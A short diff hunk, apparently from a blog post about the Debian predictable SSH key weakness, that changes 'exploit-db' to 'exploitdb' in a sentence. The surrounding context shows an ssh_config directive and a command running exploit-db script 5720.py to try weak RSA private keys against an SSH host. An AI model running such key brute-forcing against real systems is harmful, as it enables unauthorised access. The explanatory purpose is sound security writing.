@@ -213,7 +213,7 @@ Basically adding this directive to our ssh_config file should be sufficient:
 UseBlacklistedKeys yes 
 {% endcodeblock %} 
 
-In exploit-db, we use python script to try every possible private key:
+In exploitdb, we use python script to try every possible private key:
 {% codeblock %}
 $ python platforms/linux/remote/5720.py /tmp/rsa/2048 192.168.0.25 obama
 
